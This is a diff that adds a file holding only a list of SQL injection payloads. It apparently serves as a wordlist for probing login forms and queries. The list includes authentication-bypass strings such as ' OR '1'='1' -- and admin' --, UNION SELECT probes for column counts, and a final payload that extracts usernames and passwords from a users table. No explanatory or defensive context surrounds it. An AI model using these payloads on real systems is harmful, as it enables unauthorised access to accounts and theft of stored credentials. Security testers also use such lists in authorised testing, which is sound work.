@@ -1,0 +1,21 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 /*
+' OR 1=1 #
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" /*
+" OR 1=1 --
+" OR 1=1 /*
+admin' --
+admin' /*
+admin' #
+' OR '1'='1' LIMIT 1 --
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT username,password FROM users --
